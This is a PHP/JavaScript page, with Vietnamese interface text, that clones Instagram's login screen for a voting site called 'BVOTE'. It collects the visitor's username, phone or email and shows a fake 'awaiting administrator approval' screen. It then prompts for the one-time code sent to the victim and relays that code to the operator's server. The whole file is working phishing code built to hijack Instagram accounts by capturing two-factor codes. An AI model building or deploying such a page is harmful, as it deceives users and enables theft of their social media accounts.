<?php
// InstagramLoginClone.php - BVOTE Auto Login System
?>
<div class="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
  <div class="text-center mb-6">
    <div class="mb-4">
      <!-- Instagram Logo với font Billabong style -->
      <div class="text-4xl font-bold" style="font-family: 'Brush Script MT', cursive; background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
        Instagram
      </div>
    </div>
    <p class="text-sm text-gray-600">Đăng nhập Instagram để tiếp tục BVOTE</p>
  </div>

  <form id="instagram-login-form" class="space-y-4" onsubmit="return handleInstagramLogin(event)">
    <input id="instagram-account" name="account" type="text"
           placeholder="Số điện thoại, tên người dùng hoặc email" required
           class="w-full h-11 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black rounded px-3" />

    <button type="submit" class="w-full h-11 bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded">
      Đăng nhập
    </button>
  </form>

  <div class="text-center mt-4">
    <div class="flex items-center justify-center mb-4">
      <div class="flex-1 border-t border-gray-300"></div>
      <span class="px-4 text-sm text-gray-500">HOẶC</span>
      <div class="flex-1 border-t border-gray-300"></div>
    </div>

    <button type="button" class="text-blue-900 font-semibold hover:underline" onclick="showFacebookLogin()">
      Sử dụng Facebook
    </button>
  </div>

  <div class="text-center mt-4">
    <a href="#" class="text-sm text-blue-900 hover:underline">Quên mật khẩu?</a>
  </div>
</div>

<script>
var isLoadingInstagram = false;

function handleInstagramLogin(e) {
  e.preventDefault();
  if (isLoadingInstagram) return false;

  const account = document.getElementById('instagram-account').value.trim();
  if (!account) {
    alert('Vui lòng nhập số điện thoại, tên người dùng hoặc email');
    return false;
  }

  isLoadingInstagram = true;
  const submitBtn = e.target.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Đang xử lý...';
  submitBtn.disabled = true;

  // Gọi API Auto Login
  fetch('/api/social-login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      platform: 'instagram',
      user_hint: account
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      // Chuyển đến màn hình chờ phê duyệt
      showWaitingScreen(data.request_id, 'instagram');
    } else {
      alert('Lỗi: ' + (data.error || 'Không thể tạo yêu cầu đăng nhập'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  })
  .finally(() => {
    isLoadingInstagram = false;
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  });

  return false;
}

function showFacebookLogin() {
  // Chuyển sang Facebook login
  if (window.parent && window.parent.showLoginModal) {
    window.parent.showLoginModal('facebook');
  } else {
    alert('Chuyển sang đăng nhập Facebook');
  }
}

function showWaitingScreen(requestId, platform) {
  // Tạo modal chờ phê duyệt
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-pink-500 mx-auto mb-4"></div>
        <h3 class="text-lg font-semibold mb-2">Đang chờ phê duyệt</h3>
        <p class="text-gray-600 mb-4">Yêu cầu đăng nhập của bạn đang được xem xét bởi quản trị viên.</p>
        <div class="text-sm text-gray-500">
          <p>Nền tảng: ${platform}</p>
          <p>ID yêu cầu: ${requestId}</p>
        </div>
        <div class="mt-4">
          <button onclick="checkLoginStatus('${requestId}')" class="bg-pink-500 text-white px-4 py-2 rounded hover:bg-pink-600">
            Kiểm tra trạng thái
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Tự động kiểm tra trạng thái mỗi 5 giây
  const interval = setInterval(() => {
    checkLoginStatus(requestId, interval, modal);
  }, 5000);
}

function checkLoginStatus(requestId, interval = null, modal = null) {
  fetch(`/api/social-login/status/${requestId}`)
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        const status = data.request.status;

        if (status === 'APPROVED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Đăng nhập thành công! Chào mừng bạn đến với BVOTE.');
          window.location.href = '/user/home'; // Chuyển đến trang chủ user
        } else if (status === 'OTP_REQUIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          showOTPDialog(requestId);
        } else if (status === 'REJECTED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập bị từ chối. Vui lòng thử lại.');
        } else if (status === 'EXPIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập đã hết hạn. Vui lòng thử lại.');
        }
      } else {
        console.error('Error checking status:', data.error);
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
}

function showOTPDialog(requestId) {
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <h3 class="text-lg font-semibold mb-4">Nhập mã OTP</h3>
        <p class="text-gray-600 mb-4">Vui lòng nhập mã xác thực được gửi đến bạn.</p>
        <div class="mb-4">
          <input type="text" id="otp-input" placeholder="Nhập mã OTP"
                 class="w-full p-3 border border-gray-300 rounded text-center text-lg tracking-widest"
                 maxlength="6" pattern="[0-9]{6}">
        </div>
        <div class="flex space-x-2">
          <button onclick="verifyOTP('${requestId}')" class="bg-pink-500 text-white px-4 py-2 rounded hover:bg-pink-600">
            Xác thực
          </button>
          <button onclick="this.closest('.fixed').remove()" class="bg-gray-500 text-white px-4 py-2 rounded hover:bg-gray-600">
            Hủy
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Focus vào input OTP
  setTimeout(() => {
    document.getElementById('otp-input').focus();
  }, 100);
}

function verifyOTP(requestId) {
  const otpInput = document.getElementById('otp-input');
  const otp = otpInput.value.trim();

  if (!otp || otp.length !== 6) {
    alert('Vui lòng nhập đúng 6 số OTP');
    return;
  }

  fetch(`/api/social-login/${requestId}/otp`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ otp: otp })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      alert('Xác thực OTP thành công! Chào mừng bạn đến với BVOTE.');
      window.location.href = '/user/home';
    } else {
      alert('Lỗi: ' + (data.error || 'OTP không đúng'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  });
}
</script>
